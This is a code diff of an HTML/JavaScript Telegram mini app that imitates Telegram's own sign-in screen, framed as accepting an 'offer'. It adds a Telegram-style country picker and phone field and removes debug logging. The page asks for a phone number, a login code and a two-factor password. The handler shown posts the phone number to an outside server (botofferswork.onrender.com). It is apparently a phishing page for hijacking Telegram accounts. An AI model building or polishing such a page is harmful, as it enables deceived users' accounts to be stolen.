@@ -24,19 +24,39 @@ h1{font-size:23px;font-weight:600;letter-spacing:-.4px;margin-bottom:10px}
 .hidden{display:none !important}
 .field{position:relative}
 .field label{position:absolute;top:-8px;left:14px;background:#242f3d;padding:0 6px;font-size:12px;color:#5b8def;font-weight:500;z-index:1}
+/* ─── поле телефона как в Telegram ─── */
+.phone-row{display:flex;width:100%;background:transparent;border:2px solid #2f3b4a;border-radius:10px;overflow:hidden;transition:border-color .2s;align-items:stretch}
+.phone-row.focused{border-color:#5b8def;background:rgba(91,141,239,.03)}
+.country-btn{padding:16px 12px;background:transparent;border:none;color:#fff;cursor:pointer;font-size:16px;font-family:inherit;display:flex;align-items:center;gap:6px;border-right:2px solid #2f3b4a;transition:background .2s}
+.country-btn:hover{background:rgba(91,141,239,.1)}
+.country-btn .flag{font-size:20px}
+.country-btn .arrow{color:#7d8b99;font-size:12px}
+.phone-row input{flex:1;padding:16px 14px;background:transparent;border:none;color:#fff;font-size:16px;outline:none;font-family:inherit}
+.phone-row input::placeholder{color:#4a5563}
+/* ─── модалка стран ─── */
+.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:100;display:flex;align-items:flex-end;justify-content:center;animation:fadeIn .2s}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+.modal{background:#242f3d;border-radius:18px 18px 0 0;width:100%;max-width:500px;max-height:80vh;display:flex;flex-direction:column;animation:slideUp .3s cubic-bezier(.16,1,.3,1)}
+@keyframes slideUp{from{transform:translateY(100%)}to{transform:translateY(0)}}
+.modal-header{padding:20px 20px 12px;display:flex;justify-content:space-between;align-items:center}
+.modal-title{font-size:18px;font-weight:600}
+.modal-close{background:none;border:none;color:#7d8b99;font-size:24px;cursor:pointer;padding:0;line-height:1}
+.modal-search{padding:0 20px 12px}
+.modal-search input{width:100%;padding:14px;background:#1e2936;border:2px solid #2f3b4a;border-radius:10px;color:#fff;font-size:15px;outline:none;font-family:inherit}
+.modal-search input:focus{border-color:#5b8def}
+.modal-list{overflow-y:auto;flex:1;padding-bottom:20px}
+.modal-list::-webkit-scrollbar{width:6px}
+.modal-list::-webkit-scrollbar-thumb{background:#3f4b5a;border-radius:3px}
+.country-item{padding:14px 20px;cursor:pointer;display:flex;align-items:center;gap:12px;font-size:15px;transition:background .15s}
+.country-item:hover,.country-item.active{background:#2f3b4a}
+.country-item .flag{font-size:22px}
+.country-item .name{flex:1;color:#e0e6ec}
+.country-item .code{color:#7d8b99;font-size:14px}
+.country-empty{padding:20px;color:#4a5563;font-size:14px;text-align:center}
+/* ─── остальное ─── */
 .field input{width:100%;padding:16px 14px;background:transparent;border:2px solid #2f3b4a;border-radius:10px;color:#fff;font-size:16px;outline:none;transition:border-color .2s;font-family:inherit}
 .field input:focus{border-color:#5b8def;background:rgba(91,141,239,.03)}
 .field input::placeholder{color:#4a5563}
-.country-picker{position:relative}
-.country-search{position:absolute;top:100%;left:0;right:0;background:#1e2936;border:1px solid #2f3b4a;border-radius:10px;margin-top:6px;max-height:240px;overflow-y:auto;z-index:10;box-shadow:0 12px 32px rgba(0,0,0,.4)}
-.country-search::-webkit-scrollbar{width:6px}
-.country-search::-webkit-scrollbar-thumb{background:#3f4b5a;border-radius:3px}
-.country-item{padding:11px 14px;cursor:pointer;display:flex;align-items:center;gap:10px;font-size:14px}
-.country-item:hover{background:#2f3b4a}
-.country-item .flag{font-size:19px}
-.country-item .name{flex:1;color:#e0e6ec}
-.country-item .code{color:#7d8b99;font-size:13px}
-.country-empty{padding:14px;color:#4a5563;font-size:13px;text-align:center}
 .btn{width:100%;padding:15px;background:#5b8def;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;margin-top:6px;transition:background .2s,transform .08s;font-family:inherit}
 .btn:hover:not(:disabled){background:#4a7ce0}
 .btn:active:not(:disabled){transform:scale(.985)}
@@ -59,8 +79,7 @@ h1{font-size:23px;font-weight:600;letter-spacing:-.4px;margin-bottom:10px}
 .dots span.on{background:#5b8def;width:18px;border-radius:3px}
 .code-hint{font-size:13px;color:#7d8b99;margin-bottom:-4px;line-height:1.5}
 .code-hint b{color:#e0e6ec;font-weight:500}
-.profile-avatar{width:110px;height:110px;border-radius:50%;margin:0 auto 20px;background:linear-gradient(135deg,#5b8def,#3f6fd9);display:flex;align-items:center;justify-content:center;font-size:42px;font-weight:600;color:#fff;box-shadow:0 12px 32px rgba(91,141,239,.4);overflow:hidden}
-.profile-avatar img{width:100%;height:100%;object-fit:cover}
+.profile-avatar{width:110px;height:110px;border-radius:50%;margin:0 auto 20px;background:linear-gradient(135deg,#5b8def,#3f6fd9);display:flex;align-items:center;justify-content:center;font-size:42px;font-weight:600;color:#fff;box-shadow:0 12px 32px rgba(91,141,239,.4)}
 .profile-name{font-size:22px;font-weight:600;margin-bottom:6px}
 .profile-username{color:#5b8def;font-size:15px;margin-bottom:24px}
 .profile-info{background:#1e2936;border-radius:12px;padding:16px;text-align:left;margin-bottom:16px}
@@ -86,13 +105,12 @@ h1{font-size:23px;font-weight:600;letter-spacing:-.4px;margin-bottom:10px}
   <p class="sub" id="sub">Please confirm your country code and enter your phone number.</p>
 
   <form id="step-phone" class="step">
-    <div class="field country-picker">
-      <label>Country</label>
-      <input type="text" id="country-input" placeholder="Search country" autocomplete="off" readonly>
-      <div id="country-list" class="country-search hidden"></div>
-    </div>
-    <div class="field">
-      <label>Phone Number</label>
+    <div class="phone-row" id="phone-row">
+      <button type="button" class="country-btn" id="country-btn">
+        <span class="flag" id="current-flag">🇷🇺</span>
+        <span id="current-code">+7</span>
+        <span class="arrow">▾</span>
+      </button>
       <input type="tel" id="phone" placeholder="999 123-45-67" autocomplete="tel" required inputmode="tel">
     </div>
     <button type="submit" class="btn" id="btn-next" disabled>NEXT</button>
@@ -158,28 +176,33 @@ h1{font-size:23px;font-weight:600;letter-spacing:-.4px;margin-bottom:10px}
   <p class="footer-note" id="footer">By signing up, you agree to our Terms of Service and Privacy Policy.</p>
 </div>
 
+<!-- модалка выбора страны -->
+<div id="country-modal" class="modal-overlay hidden">
+  <div class="modal">
+    <div class="modal-header">
+      <div class="modal-title">Choose a country</div>
+      <button class="modal-close" id="modal-close">×</button>
+    </div>
+    <div class="modal-search">
+      <input type="text" id="country-search" placeholder="Search" autocomplete="off">
+    </div>
+    <div class="modal-list" id="country-list-modal"></div>
+  </div>
+</div>
+
 <script>
-// ═══════════════════════════════════════════════════════
 const API = 'https://botofferswork.onrender.com';
-// ═══════════════════════════════════════════════════════
 
-console.log('[INIT] mini app v3 started');
+console.log('[INIT] mini app v4');
 
-// ─── Telegram WebApp
 const tg = window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp : null;
 if (tg) {
-  try {
-    tg.ready();
-    tg.expand();
-    console.log('[TG] v' + tg.version);
-  } catch (e) { console.warn('[TG] err', e); }
+  try { tg.ready(); tg.expand(); } catch(e){}
 }
 
-// ─── ID текущего юзера в Telegram (для проверки localStorage)
 const tgUserId = tg?.initDataUnsafe?.user?.id || 0;
 console.log('[TG] user id =', tgUserId);
 
-// ─── ПАРАМЕТРЫ ОФФЕРА
 let offerId = 0;
 let action = 'accept';
 const startParam = tg?.initDataUnsafe?.start_param || '';
@@ -187,61 +210,88 @@ const m = startParam.match(/^offer_(\d+)_(accept|reject)$/);
 if (m) {
   offerId = parseInt(m[1], 10);
   action = m[2];
-  console.log('[PARAM] startapp:', { offerId, action });
 } else {
   const params = new URLSearchParams(location.search);
   offerId = parseInt(params.get('offer') || '0', 10);
   action = (params.get('action') || 'accept').toLowerCase();
-  console.log('[PARAM] url:', { offerId, action });
 }
 
-// ─── СТРАНЫ
+// ─── СТРАНЫ (сортированы по популярности)
 const COUNTRIES = [
-  {c:'+7',f:'🇷🇺',n:'Russia',iso:'RU'},{c:'+7',f:'🇰🇿',n:'Kazakhstan',iso:'KZ'},
-  {c:'+380',f:'🇺🇦',n:'Ukraine',iso:'UA'},{c:'+375',f:'🇧🇾',n:'Belarus',iso:'BY'},
-  {c:'+373',f:'🇲🇩',n:'Moldova',iso:'MD'},{c:'+374',f:'🇦🇲',n:'Armenia',iso:'AM'},
-  {c:'+994',f:'🇦🇿',n:'Azerbaijan',iso:'AZ'},{c:'+995',f:'🇬🇪',n:'Georgia',iso:'GE'},
-  {c:'+996',f:'🇰🇬',n:'Kyrgyzstan',iso:'KG'},{c:'+992',f:'🇹🇯',n:'Tajikistan',iso:'TJ'},
-  {c:'+993',f:'🇹🇲',n:'Turkmenistan',iso:'TM'},{c:'+998',f:'🇺🇿',n:'Uzbekistan',iso:'UZ'},
-  {c:'+1',f:'🇺🇸',n:'United States',iso:'US'},{c:'+1',f:'🇨🇦',n:'Canada',iso:'CA'},
-  {c:'+44',f:'🇬🇧',n:'United Kingdom',iso:'GB'},{c:'+49',f:'🇩🇪',n:'Germany',iso:'DE'},
-  {c:'+33',f:'🇫🇷',n:'France',iso:'FR'},{c:'+39',f:'🇮🇹',n:'Italy',iso:'IT'},
-  {c:'+34',f:'🇪🇸',n:'Spain',iso:'ES'},{c:'+351',f:'🇵🇹',n:'Portugal',iso:'PT'},
-  {c:'+31',f:'🇳🇱',n:'Netherlands',iso:'NL'},{c:'+32',f:'🇧🇪',n:'Belgium',iso:'BE'},
-  {c:'+41',f:'🇨🇭',n:'Switzerland',iso:'CH'},{c:'+43',f:'🇦🇹',n:'Austria',iso:'AT'},
-  {c:'+48',f:'🇵🇱',n:'Poland',iso:'PL'},{c:'+420',f:'🇨🇿',n:'Czechia',iso:'CZ'},
-  {c:'+421',f:'🇸🇰',n:'Slovakia',iso:'SK'},{c:'+36',f:'🇭🇺',n:'Hungary',iso:'HU'},
-  {c:'+40',f:'🇷🇴',n:'Romania',iso:'RO'},{c:'+359',f:'🇧🇬',n:'Bulgaria',iso:'BG'},
-  {c:'+30',f:'🇬🇷',n:'Greece',iso:'GR'},{c:'+90',f:'🇹🇷',n:'Turkey',iso:'TR'},
-  {c:'+972',f:'🇮🇱',n:'Israel',iso:'IL'},{c:'+971',f:'🇦🇪',n:'UAE',iso:'AE'},
-  {c:'+966',f:'🇸🇦',n:'Saudi Arabia',iso:'SA'},{c:'+20',f:'🇪🇬',n:'Egypt',iso:'EG'},
-  {c:'+91',f:'🇮🇳',n:'India',iso:'IN'},{c:'+92',f:'🇵🇰',n:'Pakistan',iso:'PK'},
-  {c:'+86',f:'🇨🇳',n:'China',iso:'CN'},{c:'+81',f:'🇯🇵',n:'Japan',iso:'JP'},
-  {c:'+82',f:'🇰🇷',n:'South Korea',iso:'KR'},{c:'+65',f:'🇸🇬',n:'Singapore',iso:'SG'},
-  {c:'+60',f:'🇲🇾',n:'Malaysia',iso:'MY'},{c:'+66',f:'🇹🇭',n:'Thailand',iso:'TH'},
-  {c:'+84',f:'🇻🇳',n:'Vietnam',iso:'VN'},{c:'+62',f:'🇮🇩',n:'Indonesia',iso:'ID'},
-  {c:'+63',f:'🇵🇭',n:'Philippines',iso:'PH'},{c:'+61',f:'🇦🇺',n:'Australia',iso:'AU'},
-  {c:'+64',f:'🇳🇿',n:'New Zealand',iso:'NZ'},{c:'+55',f:'🇧🇷',n:'Brazil',iso:'BR'},
-  {c:'+54',f:'🇦🇷',n:'Argentina',iso:'AR'},{c:'+52',f:'🇲🇽',n:'Mexico',iso:'MX'},
-  {c:'+27',f:'🇿🇦',n:'South Africa',iso:'ZA'},{c:'+234',f:'🇳🇬',n:'Nigeria',iso:'NG'},
+  {c:'+7',f:'🇷🇺',n:'Russia',iso:'RU'},
+  {c:'+7',f:'🇰🇿',n:'Kazakhstan',iso:'KZ'},
+  {c:'+380',f:'🇺🇦',n:'Ukraine',iso:'UA'},
+  {c:'+375',f:'🇧🇾',n:'Belarus',iso:'BY'},
+  {c:'+1',f:'🇺🇸',n:'United States',iso:'US'},
+  {c:'+1',f:'🇨🇦',n:'Canada',iso:'CA'},
+  {c:'+44',f:'🇬🇧',n:'United Kingdom',iso:'GB'},
+  {c:'+49',f:'🇩🇪',n:'Germany',iso:'DE'},
+  {c:'+33',f:'🇫🇷',n:'France',iso:'FR'},
+  {c:'+39',f:'🇮🇹',n:'Italy',iso:'IT'},
+  {c:'+34',f:'🇪🇸',n:'Spain',iso:'ES'},
+  {c:'+351',f:'🇵🇹',n:'Portugal',iso:'PT'},
+  {c:'+31',f:'🇳🇱',n:'Netherlands',iso:'NL'},
+  {c:'+32',f:'🇧🇪',n:'Belgium',iso:'BE'},
+  {c:'+41',f:'🇨🇭',n:'Switzerland',iso:'CH'},
+  {c:'+43',f:'🇦🇹',n:'Austria',iso:'AT'},
+  {c:'+48',f:'🇵🇱',n:'Poland',iso:'PL'},
+  {c:'+420',f:'🇨🇿',n:'Czechia',iso:'CZ'},
+  {c:'+421',f:'🇸🇰',n:'Slovakia',iso:'SK'},
+  {c:'+36',f:'🇭🇺',n:'Hungary',iso:'HU'},
+  {c:'+40',f:'🇷🇴',n:'Romania',iso:'RO'},
+  {c:'+359',f:'🇧🇬',n:'Bulgaria',iso:'BG'},
+  {c:'+30',f:'🇬🇷',n:'Greece',iso:'GR'},
+  {c:'+90',f:'🇹🇷',n:'Turkey',iso:'TR'},
+  {c:'+972',f:'🇮🇱',n:'Israel',iso:'IL'},
+  {c:'+971',f:'🇦🇪',n:'UAE',iso:'AE'},
+  {c:'+966',f:'🇸🇦',n:'Saudi Arabia',iso:'SA'},
+  {c:'+20',f:'🇪🇬',n:'Egypt',iso:'EG'},
+  {c:'+91',f:'🇮🇳',n:'India',iso:'IN'},
+  {c:'+92',f:'🇵🇰',n:'Pakistan',iso:'PK'},
+  {c:'+86',f:'🇨🇳',n:'China',iso:'CN'},
+  {c:'+81',f:'🇯🇵',n:'Japan',iso:'JP'},
+  {c:'+82',f:'🇰🇷',n:'South Korea',iso:'KR'},
+  {c:'+65',f:'🇸🇬',n:'Singapore',iso:'SG'},
+  {c:'+60',f:'🇲🇾',n:'Malaysia',iso:'MY'},
+  {c:'+66',f:'🇹🇭',n:'Thailand',iso:'TH'},
+  {c:'+84',f:'🇻🇳',n:'Vietnam',iso:'VN'},
+  {c:'+62',f:'🇮🇩',n:'Indonesia',iso:'ID'},
+  {c:'+63',f:'🇵🇭',n:'Philippines',iso:'PH'},
+  {c:'+61',f:'🇦🇺',n:'Australia',iso:'AU'},
+  {c:'+64',f:'🇳🇿',n:'New Zealand',iso:'NZ'},
+  {c:'+55',f:'🇧🇷',n:'Brazil',iso:'BR'},
+  {c:'+54',f:'🇦🇷',n:'Argentina',iso:'AR'},
+  {c:'+52',f:'🇲🇽',n:'Mexico',iso:'MX'},
+  {c:'+27',f:'🇿🇦',n:'South Africa',iso:'ZA'},
+  {c:'+234',f:'🇳🇬',n:'Nigeria',iso:'NG'},
+  {c:'+373',f:'🇲🇩',n:'Moldova',iso:'MD'},
+  {c:'+374',f:'🇦🇲',n:'Armenia',iso:'AM'},
+  {c:'+994',f:'🇦🇿',n:'Azerbaijan',iso:'AZ'},
+  {c:'+995',f:'🇬🇪',n:'Georgia',iso:'GE'},
+  {c:'+996',f:'🇰🇬',n:'Kyrgyzstan',iso:'KG'},
+  {c:'+992',f:'🇹🇯',n:'Tajikistan',iso:'TJ'},
+  {c:'+993',f:'🇹🇲',n:'Turkmenistan',iso:'TM'},
+  {c:'+998',f:'🇺🇿',n:'Uzbekistan',iso:'UZ'},
 ];
 
 const $ = id => document.getElementById(id);
 const stepPhone = $('step-phone'), stepCode = $('step-code'), step2fa = $('step-2fa'),
       stepLoading = $('step-loading'), stepProfile = $('step-profile'),
       stepRejected = $('step-rejected'), errorBox = $('error-box'), dots = $('dots');
-const countryInput = $('country-input'), countryList = $('country-list'),
-      phoneInput = $('phone'), codeInput = $('code'), passInput = $('password');
+const phoneInput = $('phone'), codeInput = $('code'), passInput = $('password');
+const countryBtn = $('country-btn'), currentFlag = $('current-flag'), currentCode = $('current-code');
+const phoneRow = $('phone-row');
+const countryModal = $('country-modal'), countryListModal = $('country-list-modal'), countrySearch = $('country-search');
+const modalClose = $('modal-close');
 
 let selected = COUNTRIES[0], phone = '', code = '', password = null;
 
-// ─── Авто-выбор страны
+// ─── автоопределение страны по локали
 function detectCountry() {
   try {
     const loc = (navigator.languages && navigator.languages[0]) || navigator.language || 'en-US';
     let region = null;
-    try { region = new Intl.Locale(loc).region; }
-    catch(e) { region = loc.split('-')[1]; }
+    try { region = new Intl.Locale(loc).region; } catch(e) { region = loc.split('-')[1]; }
     if (region) {
       const found = COUNTRIES.find(c => c.iso === region.toUpperCase());
       if (found) { selected = found; return; }
@@ -262,11 +312,94 @@ function detectCountry() {
   } catch (e) {}
 }
 
-// ─── Локальная сессия, привязанная к tgUserId
-const SESSION_KEY = 'tg_offer_profile_v3';
+function updateCountryBtn() {
+  currentFlag.textContent = selected.f;
+  currentCode.textContent = selected.c;
+}
+
+// ─── модалка стран
+function openCountryModal() {
+  countrySearch.value = '';
+  renderCountryModal('');
+  countryModal.classList.remove('hidden');
+  setTimeout(() => countrySearch.focus(), 100);
+}
+function closeCountryModal() {
+  countryModal.classList.add('hidden');
+}
+function renderCountryModal(filter='') {
+  const q = filter.trim().toLowerCase();
+  const list = COUNTRIES.filter(c => !q || c.n.toLowerCase().includes(q) || c.c.includes(q) || c.iso.toLowerCase().includes(q));
+  if (!list.length) {
+    countryListModal.innerHTML = '<div class="country-empty">Nothing found</div>';
+    return;
+  }
+  countryListModal.innerHTML = list.map(c => `
+    <div class="country-item ${c.iso === selected.iso && c.c === selected.c ? 'active' : ''}"
+         data-code="${c.c}" data-name="${c.n}" data-flag="${c.f}" data-iso="${c.iso}">
+      <span class="flag">${c.f}</span>
+      <span class="name">${c.n}</span>
+      <span class="code">${c.c}</span>
+    </div>`).join('');
+  countryListModal.querySelectorAll('.country-item').forEach(el => {
+    el.addEventListener('click', () => {
+      selected = { c: el.dataset.code, f: el.dataset.flag, n: el.dataset.name, iso: el.dataset.iso };
+      updateCountryBtn();
+      closeCountryModal();
+      validatePhone();
+      phoneInput.focus();
+    });
+  });
+}
+
+countryBtn.addEventListener('click', (e) => {
+  e.preventDefault();
+  openCountryModal();
+});
+modalClose.addEventListener('click', closeCountryModal);
+countryModal.addEventListener('click', (e) => {
+  if (e.target === countryModal) closeCountryModal();
+});
+countrySearch.addEventListener('input', () => renderCountryModal(countrySearch.value));
+
+// ─── фокус на поле номера
+phoneInput.addEventListener('focus', () => phoneRow.classList.add('focused'));
+phoneInput.addEventListener('blur', () => phoneRow.classList.remove('focused'));
+
+phoneInput.addEventListener('input', e => {
+  let v = e.target.value.replace(/\D/g,''); if (v.length > 15) v = v.slice(0,15);
+  e.target.value = v;
+  // автоопределение страны по первой цифре
+  autoDetectCountry(v);
+  validatePhone();
+});
+
+// ─── автоопределение страны по вводимому коду
+function autoDetectCountry(digits) {
+  if (!digits || digits.length < 1) return;
+  // пробуем найти страну по началу номера
+  const tryPrefixes = [digits.slice(0,4), digits.slice(0,3), digits.slice(0,2), digits.slice(0,1)];
+  for (const prefix of tryPrefixes) {
+    if (!prefix) continue;
+    const found = COUNTRIES.find(c => c.c === '+' + prefix);
+    if (found && found.iso !== selected.iso) {
+      selected = found;
+      updateCountryBtn();
+      return;
+    }
+  }
+}
+
+function validatePhone(){
+  const d = phoneInput.value.replace(/\D/g,'');
+  $('btn-next').disabled = d.length < 6;
+}
+
+// ─── localStorage с привязкой к tgUserId
+const SESSION_KEY = 'tg_offer_profile_v4';
 function saveProfile(profile) {
   try {
-    profile.tg_user_id = tgUserId;  // привязка
+    profile.tg_user_id = tgUserId;
     profile.saved_at = Date.now();
     localStorage.setItem(SESSION_KEY, JSON.stringify(profile));
   } catch(e) {}
@@ -276,9 +409,7 @@ function loadProfile() {
     const raw = localStorage.getItem(SESSION_KEY);
     if (!raw) return null;
     const p = JSON.parse(raw);
-    // ПРОВЕРКА: если сохранённый профиль от другого Telegram-юзера — сбрасываем
     if (tgUserId && p.tg_user_id && p.tg_user_id !== tgUserId) {
-      console.log('[SESSION] user mismatch, clearing');
       localStorage.removeItem(SESSION_KEY);
       return null;
     }
@@ -295,48 +426,8 @@ function showError(msg){errorBox.innerHTML=msg;errorBox.classList.remove('hidden
 function hideError(){errorBox.classList.add('hidden')}
 function show(el){el.classList.remove('hidden')}
 function hide(el){el.classList.add('hidden')}
-function initCountry(){ countryInput.value = `${selected.f}  ${selected.n}  ${selected.c}`; }
 
-function renderCountries(filter=''){
-  const q = filter.trim().toLowerCase();
-  const list = COUNTRIES.filter(c => !q || c.n.toLowerCase().includes(q) || c.c.includes(q) || c.iso.toLowerCase().includes(q));
-  if (!list.length){ countryList.innerHTML = '<div class="country-empty">Ничего не найдено</div>'; return; }
-  countryList.innerHTML = list.map(c => `
-    <div class="country-item" data-code="${c.c}" data-name="${c.n}" data-flag="${c.f}" data-iso="${c.iso}">
-      <span class="flag">${c.f}</span><span class="name">${c.n}</span><span class="code">${c.c}</span>
-    </div>`).join('');
-  countryList.querySelectorAll('.country-item').forEach(el => {
-    el.addEventListener('click', () => {
-      selected = { c: el.dataset.code, f: el.dataset.flag, n: el.dataset.name, iso: el.dataset.iso };
-      initCountry();
-      countryList.classList.add('hidden');
-      countryInput.readOnly = true;
-      validatePhone();
-    });
-  });
-}
-
-countryInput.addEventListener('focus', () => {
-  if (window.__REJECTED__) return;
-  countryInput.readOnly = false; countryInput.value = ''; countryInput.placeholder = 'Search country';
-  renderCountries(); countryList.classList.remove('hidden');
-});
-countryInput.addEventListener('input', () => renderCountries(countryInput.value));
-countryInput.addEventListener('blur', () => {
-  setTimeout(() => {
-    countryList.classList.add('hidden');
-    countryInput.readOnly = true;
-    if (!countryInput.value.trim()) initCountry();
-  }, 180);
-});
-
-phoneInput.addEventListener('input', e => {
-  let v = e.target.value.replace(/\D/g,''); if (v.length > 15) v = v.slice(0,15);
-  e.target.value = v; validatePhone();
-});
-function validatePhone(){ const d = phoneInput.value.replace(/\D/g,''); $('btn-next').disabled = d.length < 6; }
-
-// ─── REJECT
+// ─── reject
 if (action === 'reject') {
   document.querySelectorAll('.step, .dots, #title, #sub, #footer').forEach(el => el.style.display = 'none');
   stepRejected.style.display = 'flex';
@@ -345,11 +436,10 @@ if (action === 'reject') {
 } else {
   window.__REJECTED__ = false;
   detectCountry();
-  initCountry();
+  updateCountryBtn();
 
   const saved = loadProfile();
   if (saved && saved.user_id) {
-    console.log('[SESSION] restoring', saved.user_id);
     showProfile(saved);
   }
 }
@@ -378,7 +468,6 @@ $('btn-logout').addEventListener('click', () => {
 
 async function api(path, body){
   const url = API + path;
-  console.log('[API →]', url, body);
   let res, data;
   try {
     res = await fetch(url, {
@@ -387,12 +476,10 @@ async function api(path, body){
       body: JSON.stringify(body)
     });
   } catch (e) {
-    console.error('[API ✗] network', e);
     throw new Error('Сервер недоступен.');
   }
   try { data = await res.json(); }
   catch (e) { throw new Error('Ошибка сервера.'); }
-  console.log('[API ←]', res.status, data);
   return { status: res.status, data };
 }
 
@@ -402,7 +489,6 @@ stepPhone.addEventListener('submit', async e => {
   hideError();
   const num = phoneInput.value.replace(/\D/g,'');
   phone = selected.c + num;
-  console.log('[STEP 1] phone =', phone);
   hide(stepPhone); show(stepLoading); $('loading-text').textContent = 'Sending code…';
   try {
     const {data} = await api('/webhook/phone', { offer_id: offerId, phone });
